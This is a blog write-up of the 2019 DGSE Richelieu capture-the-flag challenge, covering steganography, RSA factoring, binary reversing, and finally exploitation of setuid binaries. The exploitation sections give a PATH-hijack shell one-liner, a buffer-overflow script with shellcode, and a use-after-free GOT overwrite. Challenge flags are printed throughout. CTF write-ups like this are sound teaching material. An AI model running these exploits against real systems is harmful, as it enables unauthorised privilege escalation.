---
title: "Writeup of the Richelieu challenge"
author: "Redouane"
date: 2019-06-14T14:55:32+02:00
description: "Writeup of the challenge organised by the French DGSN"
cover: "https://res.cloudinary.com/dik00g2mh/image/upload/v1560076433/richelieu_challenge_writeup/zdefftgc14cw53zbax6s.jpg"
tags: ["writeup", "security", "steganography", "cryptography", "reverse", "pwn"]
---
# Table of Contents
1. [The Challenge](#2899245ece0617ff86d6db5902b5cab9)
2. [The Solution](#34e74b1c7f4aad91715567cf698912f6)
	1. [Initial Recon](#7c2900701d453c0de0b02d5bbf4dae35)
	2. [a bit of History](#73ac6bbbf2f20ac2828791bbdaf4f7cf)
	3. [The First Portrait](#73aaa3df04a6aefa67ed6977ab3da72c)
	4. [The Crypto part](#7295ba9e2546e90cfc4f3cdd91b84605)
	5. [The Second portrait](#eefd0c86d4089a816d31551a02bfd966)
	6. [Reverse Engineering](#0bb98124495bb80830a7cab5ba6b015f)
	7. [Relative paths : a bad idea?](#10db30a79501647b304db784a4c60d8c)
	8. [Buffer overflow like in 1999](#552c2c2154e968fa737a77cc61b93a9c)
	9. [The best things in life are `free()`](#ed17997eb2dad9a63204e97d199decaf)
3. [Conclusion](#6f8b794f3246b0c1e1780bb4d4d5dc53)

# <span id='2899245ece0617ff86d6db5902b5cab9'>The Challenge</span>

The French external intelligence agency, known as the `DGSE`, published [a cybersecurity challenge](https://www.defense.gouv.fr/dgse/tout-le-site/le-challenge-richelieu-est-ouvert), the challenge remained open till June 14th 2019, in this writeup, I will try to explain every step of its solution.

# <span id='34e74b1c7f4aad91715567cf698912f6'>The Solution</span>

## <span id='7c2900701d453c0de0b02d5bbf4dae35'>Initial Recon</span>

We start by visiting [the challenge site](https://www.challengecybersec.fr/)

[![img1](https://res.cloudinary.com/dik00g2mh/image/upload/v1560076456/richelieu_challenge_writeup/h6kwsldq7zfhkncotbuc.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560076456/richelieu_challenge_writeup/h6kwsldq7zfhkncotbuc.png)

Nothing really interesting, all there is is a countdown, let's inspect the sourcecode of the page.

[![img2](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077004/richelieu_challenge_writeup/oqazfeujwxvvmu5oasfr.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077004/richelieu_challenge_writeup/oqazfeujwxvvmu5oasfr.png)

There is a reference to the PDF file `Richelieu.pdf`, let's check that out.

## <span id='73ac6bbbf2f20ac2828791bbdaf4f7cf'>a bit of History</span>

[![img3](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077031/richelieu_challenge_writeup/xcuu9wclkflr8kf8d0md.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077031/richelieu_challenge_writeup/xcuu9wclkflr8kf8d0md.png)

The document (which can be downloaded [here](https://drive.google.com/file/d/1oWJwgz84ms04gEDKRIiv6ZmYaL4bjtXx/view?usp=sharing)) is about the contributions of Cardinal Richelieu to cryptanalysis, and how it helped the French to anticipate the landing of English troops who came to help the Huguenots.

The pdf contains `364` pages, but only the first page contains visible text.

[![img4](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077053/richelieu_challenge_writeup/grm2yxuwysjvci6dojzj.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077053/richelieu_challenge_writeup/grm2yxuwysjvci6dojzj.png)

We notice there is hidden text.

[![img5](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077137/richelieu_challenge_writeup/jf3xanemrvnlrhnd02vr.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077137/richelieu_challenge_writeup/jf3xanemrvnlrhnd02vr.png)

The hidden text is `base64`-encoded data, let's extract it, and decode it.

```shell
pdftotext Richelieu.pdf - | tail -n +9 | sed "s/[^a-zA-Z0-9\+\/=]//g" | base64 -d >Richelieu_extracted
```

## <span id='73aaa3df04a6aefa67ed6977ab3da72c'>The First Portrait</span>

[![img6](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077159/richelieu_challenge_writeup/hboikeyqtbmirxempcdl.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077159/richelieu_challenge_writeup/hboikeyqtbmirxempcdl.png)

We get a ``jpeg`` file, a portrait of Richelieu, which can be found [here](https://drive.google.com/open?id=1dx1-o5rzAys15_fBLO8E9cqf5l2ruYdY).

[![img7](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077230/richelieu_challenge_writeup/i1qfbwjjxgalgc4c4vp4.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077230/richelieu_challenge_writeup/i1qfbwjjxgalgc4c4vp4.png)

We notice some uncommon things on that file while looking at it in a hex editor, we know that `jpeg` files end with the ``EOI`` marker ``0xffd9`` ([reference](https://en.wikipedia.org/wiki/JPEG#Syntax_and_structure)), and that file doesn't end with it, we find that marker somewhere inside the file, and after that marker, there is some appended data (the additional data is ignored by most image viewers).

Let's extract the additional data, it starts with ``PK`` at offset `0x6ccbc`, I suspect it's an archive.

(`rax2` is a base-converter, it's part of the `radare2` framework).

```shell
dd if=Richelieu_extracted of=appended_data ibs=1 skip=$(rax2 0x6ccbc)
```

[![img8](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077283/richelieu_challenge_writeup/szgirint8suizk6hsgbm.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077283/richelieu_challenge_writeup/szgirint8suizk6hsgbm.png)

It's a password-protected zip archive (you can download it [here](https://drive.google.com/file/d/1GPq5ZYDY_EHJno56YOMdUhxZ9gAXWb8l/view?usp=sharing)), we can list its content with `unzip -l`.

We find its password: `DGSE{t.D=@Bx^A%n9FQB~_VL7Zn8z=:K^4ikE=j0EGHqI}`

The archive contains the following files : `.bash_history`, `suite.zip`, `prime.txt`, `public.key`, `motDePasseGPG.txt.enc` and `lsb_RGB.png.enc`.

## <span id='7295ba9e2546e90cfc4f3cdd91b84605'>The Crypto part</span>

We start by reading the `.bash_history` file, which should contain the history of the commands that were executed.

[![img9](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077465/richelieu_challenge_writeup/uxtciejjs0bfukkwa7dx.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077465/richelieu_challenge_writeup/uxtciejjs0bfukkwa7dx.png)

- `lsb_RGB.png` is encrypted with a symmetric key.
- The key is saved to the file `motDePasseGPG.txt`.
- a `4096` bit RSA keypair is generated, private key is `priv.key`, public key is `public.key`.
- The first prime of the private RSA key is saved to a file, but some bytes are substituted in the file.
- The public key is used to encrypt ``motDePasseGPG.txt``

Our goal is first to attack the RSA encryption, if we can factorize the modulus ``N``, we will be able to decrypt ``motDePasseGPG.txt.enc``, and because we have some informations about one prime, that's feasible.
Because of the substitution, we don't know exactly for example if ``0xfb`` in the ``prime.txt`` file was also ``0xfb`` in the prime, or if it was ``0x7f`` and was substituted in the file, but because only 6 fixed byte substitutions occured, we can bruteforce all the possible primes, and get the one that divides `N`, let's first retrieve `N`.

```shell
openssl asn1parse -inform pem -in public.key -strparse 19
```

[![img10](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125994/richelieu_challenge_writeup/zkxyhwf37azg5mdwmone.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125994/richelieu_challenge_writeup/zkxyhwf37azg5mdwmone.png)

These parameters are `N` (the modulus) and `e` (the public exponent).

Once we find that prime `p` that divides `N`, let `q = N / p`, it's straightforward, we could calculate the parameters of the private key, and save them in the `PEM` format, and then decrypt the file using the private key generated, or we could just decrypt using the RSA formula, here is how decryption works:

- Calculate `phi(N) = (p-1)(q-1)`
- Calculate the private exponent `d = (1/e) mod phi(N)`
- Decrypt the encrypted data `c` by computing `c ** d (mod N)`, and remove the padding (I will not do it in my implementation).

```ruby
require'colorize'; # for colorizing output
N = 0xCD5F8A24C7605008897A3C922C0E812E769DE0A46442C350CB78C7868539F3D38AAC80B3E6A506605910E8599806B4D1D148F2F6B81DA04796A8A5AEE18F29E83E16775A2A0A00870541F6574ED1438636AE0A0C116E07104F48F72094863A3869E1C8FC220627278962FB22873E3156F18E55DEC94E970064EC7F4E0E88454012E2FD5DFE5F8D19BF170F9CCB3F46E0FD1019BCB02D9083A0703C617F996379E6478354A73AE6E6ACBCE1F4333ECFAF24366A3E977D3CD3CBFE8D8A387BD876BFDAB8488F6F47BF1FBE33010FD2D7E22B4DB2E567783CE0B606DB86B93759714C4F6396A7FB9F74C4021043B0F3D46D2633EBD43A877863DF7D680F506587C119DD64100CA831CE2AF33D951B524C5F06B49F5BF2CB381E74181930D06A80505C06ABD5BF4870F0C9FB581BD80DBA889660639F936EDEA8FE5D0C9EAE58062ED693252583C71CC782BA613E01438E69B43F9E64ECA84F9EA04E811AD7B39EFD7876D1B6B501C4F48ACCE6F24239F6C04028788135CD88C3D15BE0F2EBB7DE9E9C19A7A93037005EE0A9A640BADA332EC0D05EE9F08A832354A0487A927D5E88066E2569E6C5D4688E422BFA0B27C6171C6D7BF029BFD9165752AF19AA71B33A1EA70B6C371FB21E47F527D80B7D04F582AD9F9935AF723682DC01CA9880621870DECB7AD15648CDF4EF153016F3E6D87933B8EC54CFA1FDF87C467020A3E753;
e = 0x10001;
prime1 = File.read('prime.txt').lines;
prime1.shift;
prime1 = prime1.join.scan(/[0-9a-f]{2}/).map{|e| e.to_i(16)};
replacements = { 0x7f => 0xfb,
				 0xe1 => 0x66,
				 0xf4 => 0x12,
				 0x16 => 0x54,
				 0xa4 => 0x57,
				 0xb5 => 0xcd
				}.invert;
indices = prime1.each_with_index.select{|x,i| replacements[x]}.map(&:last);
1.upto(indices.count){|i|
	indices.combination(i){|c|
		pr = prime1.clone;
		c.each{|j|
			pr[j] = replacements[pr[j]];
		}
		pr = pr.map{|e|e.to_s(16).rjust(2,?0)}.join.to_i(16);
		if N % pr == 0
			puts "[++] found prime = #{pr.to_s.light_blue}";
			$p = pr;
			break
		end
	}
}
# found the prime, now the decryption
class String
	def numerize
		# output the number representation of a string
		self.reverse.each_codepoint.with_index.inject(0){|m,(c,i)| m + c.ord *  (0x100 ** i)};
	end
end
class Integer
	def stringify
		# output the string representation of a number
		chars = [ ];
		n  = self;
		while n != 0
			c = n & 0xff;
			n >>= 8;
			chars << c.chr;
		end
		chars.join.reverse;
	end
end
require 'openssl';
$q = N / $p;
d = e.to_bn.mod_inverse( ($p-1) * ($q-1) ).to_i;
File.open('motDePasseGPG.txt.enc', 'rb') do|f|
	puts f.read.numerize.to_bn.mod_exp(d, N).to_i.stringify.inspect.light_red;
end
```

[![img11](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077523/richelieu_challenge_writeup/uwrpa1lpnwuusblre5ql.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077523/richelieu_challenge_writeup/uwrpa1lpnwuusblre5ql.png)

The content of ``motDePasseGPG.txt`` was ``DGSE{Ti,%yei3=stlh_,5@pIrrMU.^mJC:luYbt1Qe_-Y}``, anything before the ``\x00``, including it is padding.

Lets decrypt ``lsb_RGB.png.enc`` symmetrically using that flag as the passphrase.

```shell
gpg --decrypt lsb_RGB.png.enc > lsb_RGB.png
```

## <span id='eefd0c86d4089a816d31551a02bfd966'>The Second portrait</span>

The file `lsb_RGB.png` can be found [here](https://drive.google.com/file/d/1OdJs1e4ApsuE5pdM0jrPahqr4gmbGUvC/view?usp=sharing).

[![img12](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077562/richelieu_challenge_writeup/dswbpjkzwbt9ldzxjtbq.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077562/richelieu_challenge_writeup/dswbpjkzwbt9ldzxjtbq.png)

Richelieu again :), this time, the filename ``lsb_RGB`` is a big hint towards LSB Steganography.

LSB stands for Least Significant Bit, the technique works by replacing the least significant bit of pixel values with the bits of the secret message, it goes unnoticed because when you replace the lowest bit of a value, it changes by 0 or 1, the pixel color is still the same to a viewer's eye, the technique can be used on a color channel, or on all the colors.

After trying a few things, we get the secret message using the following Python script, for each pixel, we concatenate the least significant bit of the ``R``,``G``,``B`` coordinates in this order.

```python
from PIL import Image

def get_pixels(image):
	w,h = image.size
	for x in range(w):
		for y in range(h):
			r, g, b = im.getpixel((x, y))
			yield r
			yield g
			yield b

extracted_data = ''
im = Image.open("lsb_RGB.png")
w,h = im.size
intermediate_byte = 0
byte_index = 0
for byte in get_pixels(im):
	intermediate_byte = (intermediate_byte << 1) | (byte & 1)
	byte_index += 1
	if byte_index % 8 == 0:
		extracted_data += chr(intermediate_byte)
		intermediate_byte = 0
print( extracted_data )
```

[![img13](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077639/richelieu_challenge_writeup/awaavonkn9a0qo9f18wk.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077639/richelieu_challenge_writeup/awaavonkn9a0qo9f18wk.png)

We get the hexdump of an `ELF` file (Executable and Linkable Format), that's the output of the `xxd` command, we can get the original `ELF` file by using the ``-r`` option of `xxd`.

```shell
python3 lsb_steg.py |grep -P --binary-files=text "^[0-9a-f]{8}:" | xxd -r > elf_file
```

## <span id='0bb98124495bb80830a7cab5ba6b015f'>Reverse Engineering</span>

You can download the elf file [here](https://drive.google.com/file/d/11qvXGbV7D0Jn0p8A1gbXujdF2hrZ1wcO/view?usp=sharing).

[![img14](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077687/richelieu_challenge_writeup/achmket1adxvuo1elcua.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077687/richelieu_challenge_writeup/achmket1adxvuo1elcua.png)

The file we extracted is a `statically-linked` executable that prompts for a password, using `readelf`, we can see that its entrypoint is at ``0x447f10`` (we will first put a breakpoint on it), let's try to find out how it checks our input.

If we reverse-engineer it, we will find that it's doing very common code unpacking operations : ``mmap``ping a memory page that has ``RWX`` protections for example, but we don't need to understand how it's unpacking itself, we only care about how it checks our input, for that, let's use ``gdb``, put a hardware on-access breakpoint on the first byte of our input using the `awatch` command, and check where it's accessed.

[![img15](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077733/richelieu_challenge_writeup/tiooctmsqqggjcq3uq4w.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077733/richelieu_challenge_writeup/tiooctmsqqggjcq3uq4w.png)

That's probably inside a `libc` function (no symbols are available, but it doesn't really matter), it looks like it's parsing the commandline arguments, we can use the ``finish`` command to execute till a return is hit, and check what it's doing exactly, it's parsing the path of the executable, but our input is not checked here, let's just ``continue``.

[![img16](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077754/richelieu_challenge_writeup/yj1drktmt0fpllbs5hqt.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077754/richelieu_challenge_writeup/yj1drktmt0fpllbs5hqt.png)

There is an interesting pattern here, the code above checks the length of our input, if you did not understand it right away, here is an explaination:

- initialize `rcx` with `-1`.
- keep searching (scanning) for the `NULL` byte on our input, and decrement `rcx` on each non `NULL` byte (also decrement it once when you find the `NULL` byte, and stop scanning).
- check if `rcx == -32`, `0xffffffffffffffe0` is the binary representation of the number `-32`.

This means, the code is simply checking if `length(input) == 30`

[![img17](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077810/richelieu_challenge_writeup/o939224nifq43mqnfv5u.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077810/richelieu_challenge_writeup/o939224nifq43mqnfv5u.png)

after that, the serial check is straightforward:

- There is a `buffer` at `0x004898c0`.
- the code checks if `input[0] ^ 0x33 == buffer[0]`.
- for each index `i` in the range `[1 .. 29]`, the code is checking if `buffer[i] ^ input[i] == buffer[i+1]`.

The following script retrieves the serial.

```ruby
buffer = %w(33 77 30 63 26 5d 3a 0e 3b 0d 4d 2a 1f 2e 1f 2d 4f 28 51 37 7a 14 76 20 78 0f 21 4d 21 6c 11 00);
buffer.map!{|e| e.to_i(16)}; # convert buffer to an array of integers
p 30.times.map{|i| (buffer[i]^buffer[i+1]).chr}.join
```

`DGSE{g456@g5112bgyfMnbVXw.llM}`

(Note : after completing the challenge, I've been told that the executable was packed with `UPX`, which is a very well-known packer, but I didn't bother looking for strings in the binary file at the first look).

[![img18](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077863/richelieu_challenge_writeup/cat1psruclujrj3g1a4i.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077863/richelieu_challenge_writeup/cat1psruclujrj3g1a4i.png)

We will use this password to unzip the `suite.zip` file, and we will read the `suite.txt` file that is inside it.

[![img19](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077896/richelieu_challenge_writeup/h1rv0qfducpic9bbvxhn.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077896/richelieu_challenge_writeup/h1rv0qfducpic9bbvxhn.png)

## <span id='10db30a79501647b304db784a4c60d8c'>Relative paths : a bad idea?</span>

[![img_ssh](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125642/richelieu_challenge_writeup/r0oylc112xsigkpl9evn.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125642/richelieu_challenge_writeup/r0oylc112xsigkpl9evn.png)

We connect through `SSH`, and we find a `setuid` binary that we must exploit to get privilegied access, and read the content of the file `drapeau.txt`.

The `setuid` binary provided can be found [here](https://drive.google.com/file/d/1JSinC1dOEY4HXSH2jPVkyssHb6sHuwy5/view?usp=sharing).

[![img20](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077985/richelieu_challenge_writeup/ejehw8f10pion1hh4vre.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560077985/richelieu_challenge_writeup/ejehw8f10pion1hh4vre.png)

We reverse-engineer the executable `prog.bin`, and we find out that it's doing very simple things, here it is in pseudocode.

```c
// int choice is read from the user with scanf("%d", &choice);
if (choice == 1)
	system("date '+Nous sommes le %d/%m/%Y et il est %H:%M:%S'");
else if (choice == 2)
	system("date '+Nombre de secondes depuis Epoch : %s'");
else if (choice == 3)
	system("sl");
else if (choice == 4)
	system("cal");
else
	puts("Mauvais choix :-/");
```

The vulnerability is easy to spot, we notice that the setuid executable is running commands with relative paths, the following exploit should spawn a shell when we enter `4`:

```bash
mkdir /tmp/workdir && cp /bin/sh /tmp/workdir/cal && (PATH=/tmp/workdir:$PATH ./prog.bin)
```

[![img21](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126261/richelieu_challenge_writeup/djcdzax6ymlyljwlve5v.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126261/richelieu_challenge_writeup/djcdzax6ymlyljwlve5v.png)

This works because relative paths are looked at from the `$PATH` environment variable, `cal` is resolved to `/tmp/workdir/cal`, which spawns a shell.

## <span id='552c2c2154e968fa737a77cc61b93a9c'>Buffer overflow like in 1999</span>

Another `setuid` binary (which you can download [here](https://drive.google.com/file/d/17mLfv7tKFf7SoWDnOlpkOAObBzEtfA1Z/view?usp=sharing)), this time, it prompts for a username and a password.

[![img22](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126407/richelieu_challenge_writeup/vhrpbuat2a9vmcftaehr.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126407/richelieu_challenge_writeup/vhrpbuat2a9vmcftaehr.png)

We get the following pseudocode from IDA Pro:

```c
char *__fastcall sub_40086D(char *a1)
{
  char *result; // rax
  char v2; // [rsp+10h] [rbp-30h]

  printf("login $ ");
  fgets(a1, 1000, stdin);
  a1[strlen(a1) - 1] = 0;
  printf("pass $ ", 1000LL);
  scanf("%s", &v2);
  if ( strlen(a1) > 0xA )
  {
    puts(aAttentionLeLog);
    a1[10] = 0;
  }
  if ( (unsigned int)sub_4006A6(&v2, a1) )
    result = a1;
  else
    result = 0LL;
  return result;
}
```

The vulnerability is also easy to spot, we see that the password is read at the line `scanf("%s", ...);`, and there is an obvious buffer overflow vulnerability there.

[![img24](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126445/richelieu_challenge_writeup/h3qbgu8aso0lidjddz00.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126445/richelieu_challenge_writeup/h3qbgu8aso0lidjddz00.png)

Most of the protections are disabled, but `ASLR` is still enabled (it's system-wide `ASLR`, and you can check `/proc/sys/kernel/randomize_va_space`).

First, let's find the offset at which we get control of `rip` (since the input is read on the stack), for that, we will use the `pattern_create` and `pattern_offset` commands of `peda`.

[![img25](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126567/richelieu_challenge_writeup/j4audolq5rqzs5aejrhw.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560126567/richelieu_challenge_writeup/j4audolq5rqzs5aejrhw.png)

offset is `56`.

Most `ROP` gadgets are not usable because their addresses contain `0a`, which is `\n`, `scanf` would stop reading input at it, however, we find a gadget that looks interesting : `0x0000000000400605: jmp rax;`.

If we can get the function `sub_4006A6` to return `1`, the function `sub_40086D` will return our `login`, which means, we will get `rax` to point to our `login` when we will control `rip`, and if we overwrite `rip` with `0x400605` (which does not include whitespace characters), we will redirect code execution on the stack (remember that `NX` is disabled).

The function `sub_4006a6` is checking:

- If the `login` is included in the `password`, or vice-versa.
- If the length of the `password` is `<=7`.
- If the `password` does not contain numbers.
- If the `password` does not contain uppercase characters.
- If the `password` does not contain lowercase characters.
- If the `password` does not contain special characters (none of the three classes listed above).

If none of these holds, `1` is returned, otherwise, `0` is returned.

Since our `password`, after overwriting `rip`, will overwrite our `login`, the `login` read by the program does not have a lot of use, for the shellcode, we will generate one that executes `/bin/sh`, and prepend it with `sub rsp, 0x200` because using the stack without doing that might corrupt our shellcode, stack operations will affect our instructions.

```python
from pwn import *
p = process('/home/defi2/prog.bin')
jmp_rax = 0x400605
buf =  "\x48\x81\xec\x00\x02\x00\x00" # sub rsp, 0x200
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x56\x57\x48\x89\xe6\x0f\x05"

p.sendline("nothing interesting") # login
p.sendline('\x90'*53 + "aA1" + p64(jmp_rax) + buf) # password
p.interactive()
```

[![img26](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125791/richelieu_challenge_writeup/zjlvjsjyuetuc6ktrw07.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125791/richelieu_challenge_writeup/zjlvjsjyuetuc6ktrw07.png)

## <span id='ed17997eb2dad9a63204e97d199decaf'>The best things in life are `free()`</span>

[![img27](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125818/richelieu_challenge_writeup/wmmkhddug3iak0tm7ehs.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125818/richelieu_challenge_writeup/wmmkhddug3iak0tm7ehs.png)

Still the same setup, this time, the vulnerable program (which can be found [here](https://drive.google.com/file/d/1nPYzIKDZC_OAZF5TcXDgYihWZi70Qd62/view?usp=sharing)) prompts us with a menu, after reverse-engineering it, here are the important operations performed:

- Structures, and initialized variables :

```c
	struct account {
		char* nom;
		char* id;
	};
	
	struct account* accounts = malloc(15 * sizeof(struct account));
	int accounts_count = 0;
	int var = 50;
	if (argc > 1)
		var = atoi(argv[1]);
```

- Create an element : 

```c
	struct account* elem = malloc(sizeof(struct account)); // malloc(16)
	char s[1280];
	fgets(s, 1280, stdin);
	elem->nom = malloc(strlen(s)+1); // malloc(user_specified)
	strcpy(elem->nom, s);
	elem->id = malloc(var+1); // malloc(51) without specifying a commandline argument
	fgets(elem->id, v3, stdin);
	accounts[accounts_count++] = elem;
```

- Display all the elements :

```c
	for ( int i = 0; i < accounts_count; i++)
	{
		printf("  element[%d] -> nom : %s\n", accounts[i]->nom);
		printf("  element[%d] -> id : %s\n", accounts[i]->id);
	}
```
- Destroy element :

```c
	int elem_ind = read_int();
	if (elem_ind >= 0 && elem_ind < accounts_count)
	{
		puts("destroy id : 1 , destroy name : 2");
		int choice = read_int();
		if (choice == 1)
			free(elements[i]->id);
		else
			free(elements[i]->name);
	}
```

- Change `name` :
```c
	char s[1284];
	int elem_ind = read_int();
	if (elem_ind >= 0 && elem_ind < accounts_count)
	{
		fgets(s, 9, stdin);
		s[strlen(s)-1] = '\0';
		strcpy(accounts[v7]->name, s);
	}
```

- Change `id` :

```c
	int elem_ind = read_int();
	if (elem_ind >= 0 && elem_ind < accounts_count)
	{
		fgets(s, var+2, stdin);
		s[strlen(s)-1] = '\0';
		strcpy(accounts[i]->id, s);
	}
```

We find multiple vulnerabilities in the above code:

- There is a `Use-after-free` vulnerability, because when `free` is called, the pointer is not set to `NULL`, it's possible to `free()` the `name`, then modify it for example.
- There is a `double-free` vulnerability, for the same reason, it's possible to `free()` the `name` of an element twice for example.

Both of these are exploitable, at first, I was aiming at a `fastbin` attack exploiting the `double-free`, but then, I decided to exploit the `UAF` instead, as it's more simple, and will work on a wider range of `libc` versions.

Here is the attack scenario:

- Create an element having a `name` of length `15`, and any `id` (index=0)
- Delete its `name`
- Create an element having any `name` (xyz) and any `id` (index=1)

This will trigger:

```c
struct element* a=malloc(16)
b = malloc(16)
c = malloc(51)
free(b)
struct element* d = malloc(16)
e = malloc(4)
f = malloc(51)
```

Since ``b`` is considered free (and has size ``16``) when the program is about to create a new element (it's at the head of the fastbin of its corresponding size), the next ``d = malloc(16)`` will return the same pointer as ``b``.

This means that if we edit the `name` of the element at index 0 after that, we are overwriting the pointer to the `name` of the element at index 1 at the same time.

We can get arbitary read/write primitives with the above trick, let's check the protections enabled on the vulnerable program.

[![img_prot](https://res.cloudinary.com/dik00g2mh/image/upload/v1560178745/richelieu_challenge_writeup/zdvolfsorpmhbgbwhxf3.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560178745/richelieu_challenge_writeup/zdvolfsorpmhbgbwhxf3.png)

The next steps in our exploitation are as follow:

- Edit the name of the element at index 0 with the ``GOT`` address of ``free``.
- Display all the elements, and get the address of ``free`` from the displayed `name` of the element at index 1.
- Calculate the address of ``system`` from the leaked address of ``free``.
- Edit the `name` of the element at index 0 with the ``GOT`` address of ``strcpy``.
- Edit the `name` of the element at index 1 with the address of ``system``.
- Edit the `id` of the element at index 0, this should trigger a call to ``strcpy``, which will land on ``system``, and the first argument (``dest``) has the previous id of the element at index 0 (which we control).

```python
from pwn import *
import re

p = process('/home/defi3/prog.bin')

def p48(x): # two remaining bytes are going to be 0 anyway
	return p64(x)[:6]

# create entry (index 0)
p.sendline("1")
p.sendline("a"*15)
p.sendline("sh") # id of the command at index 0, this will be passed to system

# delete name of entry at index 0
p.sendline("3")
p.sendline("0")
p.sendline("2")

# create entry (index 1)
p.sendline("1")
p.sendline("xyz")
p.sendline("anything")

# edit name of element at index 0 with free@got
p.sendline("4")
p.sendline("0")
p.sendline("\x18\x20\x60a\x00\x00\x00") # free@got, the 'a' will be overwritten with 0 at s[strlen(s)-1] = '\0'
p.sendline("2")

# get the leaked address of free, and calculate the address of system
free_adr = u64(re.search(r'ment\[1\]\s*->\s*nom\s*:\s*(......)', p.read(), re.DOTALL).group(1).ljust(8,'\x00'))
print "[+] free@libc = " + hex(free_adr)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base = free_adr - libc.sym['free']
system = libc_base + libc.sym['system']
log.success("system = " + hex(system))

# edit name of element at index 0 with strcpy@got
p.sendline("4")
p.sendline("0")
p.sendline("\x20\x20\x60a\x00\x00\x00") # strcpy@got, the 'a' will be overwritten with 0 at s[strlen(s)-1] = '\0'

# edit name of element at index 1 with system
p.sendline("4")
p.sendline("1")
p.sendline(p48(system))

# edit id of element at index 1 with anything to trigger a call to system
p.sendline("5")
p.sendline("0")
p.sendline("any")

p.interactive()
```

[![img_win](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125876/richelieu_challenge_writeup/pg7m4dnee7ncaue4ljcd.png)](https://res.cloudinary.com/dik00g2mh/image/upload/v1560125876/richelieu_challenge_writeup/pg7m4dnee7ncaue4ljcd.png)

# <span id='6f8b794f3246b0c1e1780bb4d4d5dc53'>Conclusion</span>

The challenge was fun, thanks to the organisers.

Any feedback is welcome.
